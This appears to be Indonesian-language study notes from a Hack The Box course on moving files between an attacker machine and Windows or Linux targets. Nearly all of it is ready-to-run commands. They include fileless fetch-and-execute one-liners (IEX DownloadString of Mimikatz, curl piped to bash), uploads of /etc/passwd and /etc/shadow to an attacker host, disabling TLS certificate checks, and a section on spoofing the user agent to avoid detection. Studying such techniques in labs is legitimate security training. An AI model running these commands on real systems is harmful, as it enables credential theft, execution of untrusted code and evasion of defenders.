# File Transfer

> Dirangkum dari modul [File Transfers Hack The Box](https://academy.hackthebox.com/course/preview/file-transfers)

---

<h2 align="center">Windows</h2>

### Metode 1: Copy paste dari Linux
- Cek dulu hash-nya di linux: `md5sum file`
- Konversi ke base64: `cat file |base64 -w 0;echo`
- Di windows: `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("ENCODED-BASE64"))`
- Pastikan hash-nya sama seperti di awal: `Get-FileHash PATH-FILE -Algorithm md5`

### Metode 2: download file dari sumber online dengan PowerShell
- Metode yg bisa digunakan
  ```
  Method	            Description
  OpenRead	        Returns the data from a resource as a Stream.
  OpenReadAsync	    Returns the data from a resource without blocking the calling thread.
  DownloadData	    Downloads data from a resource and returns a Byte array.
  DownloadDataAsync   Downloads data from a resource and returns a Byte array without blocking the calling thread.
  DownloadFile	    Downloads data from a resource to a local file.
  DownloadFileAsync   Downloads data from a resource to a local file without blocking the calling thread.
  DownloadString	    Downloads a String from a resource and returns a String.
  DownloadStringAsync Downloads a String from a resource without blocking the calling thread.
  ```
- Contoh dengan method DownloadFile
  ```
  (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
  (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
  ```
- Dengan method DownloadString (fileless: langsung eksekusi tanpa simpan)
  ```
  IEX (New-Object Net.WebClient).DownloadString('https://<url>/Invoke-Mimikatz.ps1')
  ```
- IEX bisa juga untuk pipeline
  ```
  (New-Object Net.WebClient).DownloadString('URL-KE-FILE-PS1') | IEX
  ```
- Menggunakan Invoke-WebRequest
  ```
  Invoke-WebRequest https://<url>/PowerView.ps1 -OutFile PowerView.ps1
  ```
#### Mengatasi error jika konfigurasi internet explorer tidak di selesaikan
Bypass dengan *-UseBasicParsing*
```
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
#### Mengatasi error terkait dengan sertifikat SSL/TLS not trusted
````
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
````

### Metode 3: SMB download
- Server SMB di komputer attacker
  ```
  sudo impacket-smbserver share -smb2support /tmp/smbshare
  ```
- Dari komputer target
  ```
  copy \\<ip>\share\nc.exe
  ```
- Versi windows baru memblokir akses yang tidak terautentikasi
- Server SMB di komputer attacker:
  ```
  sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
  ```
- Dari komputer target
  ```
  net use n: \\192.168.220.133\share /user:test test
  copy n:\nc.exe
   ```

### Metode 4: FTP download
- Install server ftp di komputer attacker
  ```
  sudo pip3 install pyftpdlib
  ```
- Jalankan di port 21 (user anonymous secara default aktif)
  ```
  sudo python3 -m pyftpdlib --port 21
  ```
- Download dari ftp dengan powershell
  ```
  (New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\ftp-file.txt')
  ```
- Membuat ftp interaktif di komputer target:
  ```
  C:\batagor> echo open <ip> > ftpcommand.txt
  C:\batagor> echo USER anonymous >> ftpcommand.txt
  C:\batagor> echo binary >> ftpcommand.txt
  C:\batagor> echo GET file.txt >> ftpcommand.txt
  C:\batagor> echo bye >> ftpcommand.txt
  C:\batagor> ftp -v -n -s:ftpcommand.txt
  ftp> open <ip>
  Log in with USER and PASS first.
  ftp> USER anonymous

  ftp> GET file.txt
  ftp> bye

  C:\batagor>more file.txt
  Ini isi file contoh
  ```

### Metode 5: Upload dengan encode Base64 di PowerShell
- Di komputer target
  ```
  [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
  ```
- Salin hash dan paste di komputer attacker (linux)
  ```
  echo ENCODED_BASE64 > base64 -d > hosts
  ```
- Pastikan file sama, verifikasi dengan hash

### Metode 6: PowerShell Web Uploads
- Di komputer attacker
  ```
  pip3 install uploadserver
  python3 -m uploadserver
  ```
- Di komputer target (windows)
  ```
  IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
  Invoke-FileUpload -Uri http://<ip>:<port>/upload -File C:\Windows\System32\drivers\etc\hosts
  ```
- Upload dengan format Base64
- Di komputer attacker
  ```
  nc -lvnp 8000
  ```
- Di komputer target
  ```
  $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
  Invoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64
  ```

### Metode 7: SMB uploads
- Di komputer attacker
  ```
  sudo pip3 install wsgidav cheroot
  sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
  ```
- Tes koneksi dari komputer target
  ```
  dir \\192.168.49.128\DavWWWRoot
  ```
- Tes upload file dari komputer target
  ```
  copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
  copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
  ```

### Metode 7: FTP uploads
- Di komputer attacker
  ```
  sudo python3 -m pyftpdlib --port 21 --write
  ```
- Di komputer target (windows)
  ```
  (New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
  ```

---

<h2 align="center">Linux</h2>

### Metode 1: Copy paste encode
- Di komputer attacker
  ```
  cat id_rsa |base64 -w 0;echo
  ```
- Di komputer target
  ```
  echo -n encoded_id_rsa | base64 -d > id_rsa
  ```
- Verifikasi file dengan hash

### Metode 2: download dari sumber online
- Dengan wget
  ```
  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
  ```
- Dengan curl
  ```
  curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
  ```

### Metode 3: Fileless di linux
- Dengan curl
  ```
  curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
  ```
- Dengan wget
  ```
  wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
  ```

### Metode 4: download dengan bash (/dev/tcp)
- Koneksi di web server komputer target
  ```
  exec 3<>/dev/tcp/10.10.10.32/80
  ```
- Ambil file
  ```
  echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
  ```
- Tampilkan respon
  ```
  cat <&3
  ```

### Metode 5: SSH download
- Di komputer attacker
  ```
  sudo systemctl enable ssh
  sudo systemctl start ssh
  ```
- Cek listening port ssh
  ```
  netstat -lnpt
  ```
- Download dari target dengan scp
  ```
  scp plaintext@<ip>:/root/myroot.txt .
  ```

### Metode 6: web upload
- Di komputer attacker
  ```
  sudo python3 -m pip install --user uploadserver
  ```
- Buat *selfsigned certificate* (masih di komputer attacker)
  ```
  openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
  ```
- Jalankan web server
  ```
  mkdir https && cd https
  sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
  ```
- Upload dari komputer target
  ```
  curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
  ```

### Metode 7: alternatif metode transfer file web
#### Membuat server web
- Dengan python3: `python3 -m http.server`
- Dengan python2.7: `python2.7 -m SimpleHTTPServer`
- Dengan PHP: `php -S 0.0.0.0:8000`
- Dengan ruby: `ruby -run -ehttpd . -p8000`
- Download file dengan curl/wget

### Metode 8: SCP upload

```
scp /path-file-yg-diupload username@10.129.86.90:/home/batagor/
```

<h2 align="center">Transfer file dengan kode</h2>

- Menggunakan python
  ```
  python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
  python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
  ```
- Menggunakan PHP
  ```
  php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
  php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
  php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
  ```
- Menggunakan ruby
  ```
  ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
  ```
- Menggunakan perl
  ```
  perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
  ```
- Skrip jawa
  - Buat file wget.js, isinya:
    ```
    var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
    WinHttpReq.Send();
    BinStream = new ActiveXObject("ADODB.Stream");
    BinStream.Type = 1;
    BinStream.Open();
    BinStream.Write(WinHttpReq.ResponseBody);
    BinStream.SaveToFile(WScript.Arguments(1));
    ```
  - Download dengan skrip tadi dari windows
    ```
    cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
    ```
- Menggunakan vbscript
  - Buat file wget.vbs, isinya:
    ```
    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
    dim bStrm: Set bStrm = createobject("Adodb.Stream")
    xHttp.Open "GET", WScript.Arguments.Item(0), False
    xHttp.Send
    
    with bStrm
        .type = 1
        .open
        .write xHttp.responseBody
        .savetofile WScript.Arguments.Item(1), 2
    end with
    ```
  - Download dengan skrip tadi dari windows
    ```
    cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
    ```
- Upload file dengan python. jalankan server upload di target
  ```
  python3 -m uploadserver 
  ```
- Satu baris kode piton untuk upload
  ```
  python3 -c 'import requests;requests.post("http://<ip>:8000/upload",files={"files":open("/etc/passwd","rb")})'
  ```
  
<h2 align="center">Metode lain</h2>

#### Menggunakan Netcat (nc) dan Ncat
- Jalan di komputer target
  ```
  nc -l -p 8000 > batagor.exe
  ncat -l -p 8000 --recv-only > batagor.exe
  ```
- Jalan di komputer attacker (-q 0 artinya tutup koneksi setelah selesai)
  ```
  nc -q 0 <ip> 8000 < batagor.exe
  ncat --send-only <ip> 8000 < batagor.exe
  ```
#### Kirim file sebagai input dengan netcat dan ncat
- Di komputer attacker
  ```
  sudo nc -l -p 443 -q 0 < batagor.exe
  sudo ncat -l -p 443 --send-only < batagor.exe
  ```
- Di target
  ```
  nc <ip> 443 > batagor.exe
  ncat <ip> 443 --recv-only > batagor.exe
  ```

---

<h2 align="center">Menghindari Deteksi</h2>

#### GANTI USER AGENT
- List user agent yg ada di windows
  ```
  [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
  ```
- Dari list yg ada, pake salah 1
  ```
  $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
  Invoke-WebRequest http://<ip>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
  ```
